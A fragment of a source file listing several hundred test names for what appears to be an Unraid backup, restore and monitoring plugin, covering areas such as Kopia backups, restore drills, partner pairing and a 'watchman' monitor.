'testSetupMakeFolder', 'testRestoreShares', 'testRestoreSnapsHold', 'testRestorePaths', 'testRestoreBrowse', 'testRestoreNextcloud', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDbStopped', 'testRestoreNames', 'testRestoreInUse', 'testRestoreSettled', 'testRestoreUnfinished', 'testRestoreArrayStopWhy', 'testRestoreMeasuring', 'testRestorePutbackDb', 'testRestoreConfigNoTemplate', 'testRestoreDrill', 'testDrillSqliteAppIndex', 'testDrillShareFile', 'testDrillImageData', 'testSnapRead', 'testDrillSnapRead', 'testRenameFree', 'testRestorePartner', 'testRestoreMoveGuide', 'testPartnerTicket', 'testPartnerDoorDocs', 'testPartnerRepair', 'testPartnerStart', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testWatchmanNetIpsFamilies', 'testWatchmanNetMikrotik', 'testSnapshotPartner', 'testSnapshotBusy', 'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorDockerOff', 'testAdvisorInstall', 'testAdvisorOldTemplate', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testTruthLogsWatch', 'testLogsRules', 'testLogsPlugins', 'testLogsMine', 'testLogsFilters', 'testLogsFiltersPage', 'testWatchWakesPage', 'testWatchmanWakes', 'testWatchmanWakeTrail', 'testMetrics', 'testWatchmanCats', 'testWatchmanRules', 'testWatchmanKnown', 'testWatchmanSettings', 'testWatchmanRules6a', 'testWatchmanRules6b', 'testWatchmanRules6c', 'testWatchmanRules6d', 'testWatchmanRules6e', 'testWatchmanRules6f', 'testWatchmanRules6g', 'testWatchmanBookMore', 'testWatchmanVuln', 'testWatchmanVulnSoftware', 'testWatchmanHot', 'testLogsigns', 'testWatchmanSigns', 'testWatchmanHw', 'testWatchmanCpuFaults', 'testWatchmanWear', 'testWatchmanHwBookMore', 'testWatchman', 'testWatchmanGone', 'testWatchmanSerious', 'testWatchmanTeamLeadOne', 'testWatchmanSeriousUndo', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanOwnCron', 'testWatchmanFlow', 'testWatchmanFlowPull', 'testWatchmanFlowGone', 'testWatchmanFlowFiles', 'testWatchmanPosture', 'testWatchmanPrivilegedStopped', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanStartFiles', 'testWatchmanGateway', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive', 'testWatchmanGoLines', 'testWatchmanFlowSources', 'testWatchmanNetMikrotikBook', 'testAdvisorMikrotikGuide', 'testDashboardJobs', 'testBackupKopiaOrphans', 'testBackupOldSourcesPage', 'testKopiaEmptied', 'testKopiaEmptiedCache', 'testBackupFutureFiles', 'testKopiaLockGuard', 'testBackup74Polish', 'testBackupAppShare', 'testSetupLeftUnsaved', 'testTipNeverKept', 'testSilentControlsMore', 'testBackupAsleepNoMust', 'testSetupUnknownKey', 'testBackupVolumeCache', 'testBackupGonePackage', 'testBackupMovedPackage', 'testSetupApplyHonest', 'testSetupViaShare', 'testSetupTravelPicture', 'testBackupTruthProtection', 'testBackupTruthShares', 'testBackupResults', 'testRestoreTruthChips', 'testSetupOwnDatasetApply', 'testBackupNcOpen', 'testBackupPausedStopped', 'testSetupSearch', 'testBackupPlaceVerdict', 'testWatchmanFlowGuess', 'testWatchmanGuessMore', 'testBackupLastRunEnded', 'testOffsiteReach', 'testDockerSilent', 'testKopiaHang', 'testKopiaWatch', 'testWatchmanHold', 'testBackupBatchH', 'testBackupRetention',
                       'testWhereAfterWatchman', 'testWhereVmStop', 'testWhereVmMigratable', 'testWhereTunables', 'testBackupSparse', 'testWhereTakeOver', 'testWhereDesk', 'testWhereProtectionTruth', 'testWhereCronTruth', 'testWhereMoverAdvice', 'testSpace', 'testWhereMap', 'testCleanupSizesUnknown', 'testArrayStoppedDataDir', 'testWhereBuilding', 'testCleanupTick', 'testCleanupJobCap', 'testCleanupJobSameResult', 'testStaffMerged', 'testStaffOrder', 'testHireWith', 'testHireNeeds', 'testMovedDesk', 'testMigrateJackId', 'testMigrateMediaCache', 'testMigrateWakes', 'testSupporter', 'testLeftovers', 'testOfficeLanguage', 'testThemeSwitch', 'testSizeSwitch', 'testApiLook', 'testLookPage', 'testLookOldRun', 'testUpdateNotice', 'testReportDialog', 'testSearchPlaces', 'testSearchItems', 'testSearchGuides', 'testApiGzip', 'testFlashDownload', 'testWatchmanApiDoor', 'testCaretakerApi', 'testCaretakerNetworks', 'testSetupMessages', 'testDriftCodes', 'testIconStacks', 'testPartnerPairing', 'testPartnerUsonetSimple', 'testPartnerAddress', 'testPartnerWatch', 'testPartnerGone', 'testPartnerRelease', 'testPartnerUnits', 'testPartnerTolerant', 'testMigrate', 'testBackupReplan', 'testBackupPairsReplan', 'testUnraidTested', 'testCronBack', 'testPlgGuard', 'testCleanEnv', 'testPlgInstall', 'testWatchmanRoundWait', 'testPlgRemove', 'testBackupLetGo', 'testBackupAbortAsked', 'testJackSetupFresh', 'testApiGetOffline', 'testSupporterList', 'testReportDialogImages', 'testReportDialogDiagnostics', 'testReportDialogOwnWords', 'testReportDialogDesk',
                       'testRestoreReviewPaths', 'testRestoreSharesTick', 'testBackupSharesTick', 'testBackupRunEnded', 'testRestoreGapsPage', 'testRestoreGapsAgent', 'testRestoreGapsSwap', 'testRestoreShareUnlisted', 'testRestoreGapsLibvirt', 'testRestoreReviewJob', 'testRestoreReviewForeign', 'testRestoreReviewPeek',
                       'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchFilter', 'testWatchBookNoteSome', 'testWatchmanAtPlugin', 'testWatchmanAtLeft', 'testWatchmanBootNoise', 'testWatchmanAtOnce', 'testWatchmanAtTold', 'testParityWhy', 'testCleanupVolumes', 'testHiddenStoreroom', 'testFilterWords', 'testFilterBar', 'testOfficeJobScheduleNext', 'testBackupTiles', 'testBackupPartnerEta', 'testJackLastRunDuringRun', 'testJackListLost', 'testJackPoolTileBudget', 'testJackThemes', 'testSnapPoolSplit', 'testTruthRestPages', 'testSnapArrayDisks', 'testTilesMediaPages', 'testCleanupInUseLocked', 'testCleanupOrphanDatasets', 'testPlaceReadersNoSettings', 'testCleanupSnapOnly', 'testCleanupSnapKept', 'testCleanupDrillCopies', 'testStaleShares', 'testSkipPlaces', 'testCleanupSkipGreeting', 'testCleanupTiles', 'testRestoreTiles', 'testTilesConvention', 'testSections', 'testLights', 'testDeskPages', 'testScheduleTile', 'testTourSchedules', 'testUsoNetPin', 'testUsoNetRule', 'testUsoNetStatus', 'testFanboyLook'],
